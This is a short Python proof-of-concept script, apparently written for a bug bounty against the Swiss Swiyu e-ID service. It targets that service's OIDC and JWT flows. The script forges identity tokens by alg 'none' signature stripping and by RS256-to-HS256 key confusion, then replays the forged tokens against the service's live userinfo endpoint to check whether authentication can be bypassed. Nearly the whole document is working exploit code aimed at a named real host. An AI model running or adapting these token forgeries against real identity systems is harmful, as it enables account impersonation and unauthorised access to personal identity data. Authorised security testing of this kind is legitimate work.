"""
Swiyu eID Bug Bounty - OIDC / JWT Security Auditing Framework PoC
Focus: Automated validation of e-ID identity flows, JWT signature validation, and OIDC misconfigurations.
"""
import requests
import jwt

class SwiyuEIDAuditor:
    def __init__(self, base_url="https://api.swiyu.admin.ch"):
        self.base_url = base_url
        self.oidc_endpoints = self._discover_endpoints()
        
    def _discover_endpoints(self):
        # Reconnaissance: Map OpenID configuration to locate authorization and token endpoints
        try:
            return requests.get(f"{self.base_url}/.well-known/openid-configuration", timeout=5).json()
        except requests.RequestException:
            return {"userinfo_endpoint": f"{self.base_url}/userinfo"}

    def audit_jwt_signature_bypass(self, valid_token):
        # Vulnerability Test: 'alg': 'none' signature bypass in e-ID token
        decoded_payload = jwt.decode(valid_token, options={"verify_signature": False})
        forged_token = jwt.encode(decoded_payload, key="", algorithm="none")
        
        response = requests.get(
            self.oidc_endpoints.get("userinfo_endpoint"), 
            headers={"Authorization": f"Bearer {forged_token}"},
            timeout=5
        )
        return response.status_code == 200

    def audit_key_confusion(self, valid_token, public_key_pem):
        # Vulnerability Test: Asymmetric to Symmetric Key Confusion (RS256 -> HS256)
        decoded_payload = jwt.decode(valid_token, options={"verify_signature": False})
        forged_token = jwt.encode(decoded_payload, key=public_key_pem, algorithm="HS256")
        
        response = requests.get(
            self.oidc_endpoints.get("userinfo_endpoint"), 
            headers={"Authorization": f"Bearer {forged_token}"},
            timeout=5
        )
        return response.status_code == 200

    def execute_audit_suite(self, sample_token, pub_key):
        print("[*] Initiating Swiyu eID Identity Flow Audit...")
        if self.audit_jwt_signature_bypass(sample_token):
            print("[CRITICAL] eID Provider vulnerable to 'alg=none' bypass!")
        if self.audit_key_confusion(sample_token, pub_key):
            print("[CRITICAL] eID Provider vulnerable to RSA/HMAC Key Confusion!")
        print("[*] eID Audit suite complete.")

# Example usage:
# auditor = SwiyuEIDAuditor()
# auditor.execute_audit_suite(TEST_EID_TOKEN, EID_PUBLIC_KEY)
